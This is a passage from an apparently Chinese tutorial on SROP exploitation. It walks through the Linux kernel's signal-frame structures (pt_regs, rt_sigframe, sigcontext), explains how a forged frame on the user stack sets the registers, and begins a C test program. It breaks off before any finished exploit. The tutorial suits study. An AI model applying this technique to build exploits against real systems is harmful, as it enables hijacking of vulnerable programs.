+<p>我们发现改写寄存器的主要操作就在这一步完成的，其中<code>regs</code>结构体保存在内核里面，<code>sc</code>则是在用户栈上，从用户栈上恢复寄存器到程序<code>regs</code>结构体，在最后函数退出时就会将<code>regs</code>中的值赋给寄存器了。</p>
+<p>先来看看<code>pt_regs</code>的定义:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">pt_regs</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cm">/*</span>
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="cm"> * C ABI says these regs are callee-preserved. They aren't saved on kernel entry</span>
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="cm"> * unless syscall needs a complete, fully filled "struct pt_regs".</span>
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="cm"> */</span>
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r15</span><span class="p">;</span>
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r14</span><span class="p">;</span>
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r13</span><span class="p">;</span>
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r12</span><span class="p">;</span>
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">bp</span><span class="p">;</span>
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">bx</span><span class="p">;</span>
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="cm">/* These regs are callee-clobbered. Always saved on kernel entry. */</span>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r11</span><span class="p">;</span>
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r10</span><span class="p">;</span>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r9</span><span class="p">;</span>
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r8</span><span class="p">;</span>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ax</span><span class="p">;</span>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">cx</span><span class="p">;</span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">dx</span><span class="p">;</span>
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">si</span><span class="p">;</span>
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">di</span><span class="p">;</span>
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="cm">/*</span>
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="cm"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span>
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="cm"> * On hw interrupt, it's IRQ number:</span>
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="cm"> */</span>
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">orig_ax</span><span class="p">;</span>
+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="cm">/* Return frame for iretq */</span>
+<a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ip</span><span class="p">;</span>
+<a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">cs</span><span class="p">;</span>
+<a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
+<a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">sp</span><span class="p">;</span>
+<a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">ss</span><span class="p">;</span>
+<a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="cm">/* top of stack page */</span>
+<a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a><span class="p">};</span>
+</code></pre></div>
+<p>再看看**sigcontext**结构体，这个尤为重要，是SROP的核心结构体</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">pretcode</span><span class="p">;</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w"> </span><span class="n">uc</span><span class="p">;</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">siginfo</span><span class="w"> </span><span class="n">info</span><span class="p">;</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w"> </span><span class="cm">/* fp state follows here */</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="p">};</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">   </span><span class="n">uc_flags</span><span class="p">;</span>
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w">  </span><span class="o">*</span><span class="n">uc_link</span><span class="p">;</span>
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w"> </span><span class="n">stack_t</span><span class="w">    </span><span class="n">uc_stack</span><span class="p">;</span>
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="n">uc_mcontext</span><span class="p">;</span>
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="w"> </span><span class="kt">sigset_t</span><span class="w">   </span><span class="n">uc_sigmask</span><span class="p">;</span><span class="w"> </span><span class="cm">/* mask last for extensibility */</span>
+<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="p">};</span>
+<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>
+<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigaltstack</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">ss_sp</span><span class="p">;</span>
+<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ss_flags</span><span class="p">;</span>
+<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">ss_size</span><span class="p">;</span>
+<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="p">}</span><span class="w"> </span><span class="n">stack_t</span><span class="p">;</span>
+<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>
+<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r8</span><span class="p">;</span>
+<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r9</span><span class="p">;</span>
+<a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r10</span><span class="p">;</span>
+<a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r11</span><span class="p">;</span>
+<a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r12</span><span class="p">;</span>
+<a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r13</span><span class="p">;</span>
+<a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r14</span><span class="p">;</span>
+<a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r15</span><span class="p">;</span>
+<a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rdi</span><span class="p">;</span>
+<a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rsi</span><span class="p">;</span>
+<a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rbp</span><span class="p">;</span>
+<a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rbx</span><span class="p">;</span>
+<a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rdx</span><span class="p">;</span>
+<a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rax</span><span class="p">;</span>
+<a id="__codelineno-16-37" name="__codelineno-16-37" href="#__codelineno-16-37"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rcx</span><span class="p">;</span>
+<a id="__codelineno-16-38" name="__codelineno-16-38" href="#__codelineno-16-38"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rsp</span><span class="p">;</span>
+<a id="__codelineno-16-39" name="__codelineno-16-39" href="#__codelineno-16-39"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rip</span><span class="p">;</span>
+<a id="__codelineno-16-40" name="__codelineno-16-40" href="#__codelineno-16-40"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">eflags</span><span class="p">;</span><span class="w">  </span><span class="cm">/* RFLAGS */</span>
+<a id="__codelineno-16-41" name="__codelineno-16-41" href="#__codelineno-16-41"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">cs</span><span class="p">;</span>
+<a id="__codelineno-16-42" name="__codelineno-16-42" href="#__codelineno-16-42"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">gs</span><span class="p">;</span>
+<a id="__codelineno-16-43" name="__codelineno-16-43" href="#__codelineno-16-43"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">fs</span><span class="p">;</span>
+<a id="__codelineno-16-44" name="__codelineno-16-44" href="#__codelineno-16-44"></a><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-45" name="__codelineno-16-45" href="#__codelineno-16-45"></a><span class="w">  </span><span class="n">__u16</span><span class="w">   </span><span class="n">ss</span><span class="p">;</span><span class="w"> </span><span class="cm">/* If UC_SIGCONTEXT_SS */</span>
+<a id="__codelineno-16-46" name="__codelineno-16-46" href="#__codelineno-16-46"></a><span class="w">  </span><span class="n">__u16</span><span class="w">   </span><span class="n">__pad0</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Alias name for old (!UC_SIGCONTEXT_SS) user-space */</span>
+<a id="__codelineno-16-47" name="__codelineno-16-47" href="#__codelineno-16-47"></a><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-16-48" name="__codelineno-16-48" href="#__codelineno-16-48"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">err</span><span class="p">;</span>
+<a id="__codelineno-16-49" name="__codelineno-16-49" href="#__codelineno-16-49"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">trapno</span><span class="p">;</span>
+<a id="__codelineno-16-50" name="__codelineno-16-50" href="#__codelineno-16-50"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">oldmask</span><span class="p">;</span>
+<a id="__codelineno-16-51" name="__codelineno-16-51" href="#__codelineno-16-51"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">cr2</span><span class="p">;</span>
+<a id="__codelineno-16-52" name="__codelineno-16-52" href="#__codelineno-16-52"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_fpstate</span><span class="w"> </span><span class="n">__user</span><span class="w">  </span><span class="o">*</span><span class="n">fpstate</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Zero when no FPU context */</span>
+<a id="__codelineno-16-53" name="__codelineno-16-53" href="#__codelineno-16-53"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">reserved1</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<a id="__codelineno-16-54" name="__codelineno-16-54" href="#__codelineno-16-54"></a><span class="p">};</span>
+</code></pre></div>
+<p>那么实际上，整个我们要布置的payload应该是<code>rt_sigframe</code>展开后：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">rt_sigframe</span><span class="p">{</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">pretcode</span><span class="p">;</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">   </span><span class="n">uc_flags</span><span class="p">;</span><span class="w">    </span>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w">  </span><span class="o">*</span><span class="n">uc_link</span><span class="p">;</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">ss_sp</span><span class="p">;</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ss_flags</span><span class="p">;</span>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">ss_size</span><span class="p">;</span>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r8</span><span class="p">;</span>
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r9</span><span class="p">;</span>
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r10</span><span class="p">;</span>
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r11</span><span class="p">;</span>
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r12</span><span class="p">;</span>
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r13</span><span class="p">;</span>
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r14</span><span class="p">;</span>
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">r15</span><span class="p">;</span>
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rdi</span><span class="p">;</span>
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rsi</span><span class="p">;</span>
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rbp</span><span class="p">;</span>
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rbx</span><span class="p">;</span>
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rdx</span><span class="p">;</span>
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rax</span><span class="p">;</span>
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rcx</span><span class="p">;</span>
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rsp</span><span class="p">;</span>
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">rip</span><span class="p">;</span>
+<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">eflags</span><span class="p">;</span><span class="w">  </span><span class="cm">/* RFLAGS */</span>
+<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">cs</span><span class="p">;</span>
+<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">gs</span><span class="p">;</span>
+<a id="__codelineno-17-28" name="__codelineno-17-28" href="#__codelineno-17-28"></a><span class="w"> </span><span class="n">__u16</span><span class="w">    </span><span class="n">fs</span><span class="p">;</span>
+<a id="__codelineno-17-29" name="__codelineno-17-29" href="#__codelineno-17-29"></a><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-17-30" name="__codelineno-17-30" href="#__codelineno-17-30"></a><span class="w">  </span><span class="n">__u16</span><span class="w">   </span><span class="n">ss</span><span class="p">;</span><span class="w"> </span><span class="cm">/* If UC_SIGCONTEXT_SS */</span>
+<a id="__codelineno-17-31" name="__codelineno-17-31" href="#__codelineno-17-31"></a><span class="w">  </span><span class="n">__u16</span><span class="w">   </span><span class="n">__pad0</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Alias name for old (!UC_SIGCONTEXT_SS) user-space */</span>
+<a id="__codelineno-17-32" name="__codelineno-17-32" href="#__codelineno-17-32"></a><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-17-33" name="__codelineno-17-33" href="#__codelineno-17-33"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">err</span><span class="p">;</span>
+<a id="__codelineno-17-34" name="__codelineno-17-34" href="#__codelineno-17-34"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">trapno</span><span class="p">;</span>
+<a id="__codelineno-17-35" name="__codelineno-17-35" href="#__codelineno-17-35"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">oldmask</span><span class="p">;</span>
+<a id="__codelineno-17-36" name="__codelineno-17-36" href="#__codelineno-17-36"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">cr2</span><span class="p">;</span>
+<a id="__codelineno-17-37" name="__codelineno-17-37" href="#__codelineno-17-37"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_fpstate</span><span class="w"> </span><span class="n">__user</span><span class="w">  </span><span class="o">*</span><span class="n">fpstate</span><span class="p">;</span><span class="w"> </span><span class="cm">/* Zero when no FPU context */</span>
+<a id="__codelineno-17-38" name="__codelineno-17-38" href="#__codelineno-17-38"></a><span class="w"> </span><span class="n">__u64</span><span class="w">    </span><span class="n">reserved1</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<a id="__codelineno-17-39" name="__codelineno-17-39" href="#__codelineno-17-39"></a><span class="w"> </span><span class="kt">sigset_t</span><span class="w">   </span><span class="n">uc_sigmask</span><span class="p">;</span><span class="w"> </span><span class="cm">/* mask last for extensibility */</span>
+<a id="__codelineno-17-40" name="__codelineno-17-40" href="#__codelineno-17-40"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">siginfo</span><span class="w"> </span><span class="n">info</span><span class="p">;</span><span class="w"> </span><span class="c1">//直接忽略，基本不影响程序运行</span>
+<a id="__codelineno-17-41" name="__codelineno-17-41" href="#__codelineno-17-41"></a>
+<a id="__codelineno-17-42" name="__codelineno-17-42" href="#__codelineno-17-42"></a><span class="p">}</span>
+</code></pre></div>
+<p>这张图算很老了，但是很经典:
+<img alt="srop payload 结构体" src="../images/SROP/srop-example-1.png">
+我们跟踪<code>restore_sigcontext</code>的<code>frame = (struct rt_sigframe __user *)(regs-&gt;sp - sizeof(long));</code>这一行。可以发现这一行代码基于用户栈指针rsp获得了<code>frame</code>。后面该函数又会基于该frame给寄存器赋值。</p>
+<p>我们看到这里也就知道了SROP是比较耗栈上空间的。一个 Signal Frame 在 x64 下通常占用约 0x100~0x200 字节(连续)，栈溢出时要确保有足够空间。</p>
+<p>那么我们在下面贴出测试代码，验证我们之前分析的准确性</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">"kernelpwn.h"</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">stack_t</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ss_sp</span><span class="p">;</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ss_flags</span><span class="p">;</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">ss_size</span><span class="p">;</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="p">}</span><span class="w"> </span><span class="p">;</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigset_t</span><span class="p">{</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">sig</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="p">}</span><span class="w"> </span><span class="p">;</span>
+<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
+<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">   </span><span class="n">uc_flags</span><span class="p">;</span>
+<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">ucontext</span><span class="w">  </span><span class="o">*</span><span class="n">uc_link</span><span class="p">;</span>
+<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="w"> </span><span class="n">stack_t</span><span class="w">    </span><span class="n">uc_stack</span><span class="p">;</span>
+<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigcontext</span><span class="w"> </span><span class="n">uc_mcontext</span><span class="p">;</span>
+<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="w"> </span><span class="kt">sigset_t</span><span class="w">   </span><span class="n">uc_sigmask</span><span class="p">;</span><span class="w"> </span><span class="cm">/* mask last for extensibility */</span>
+<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="p">};</span>
+<a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a>
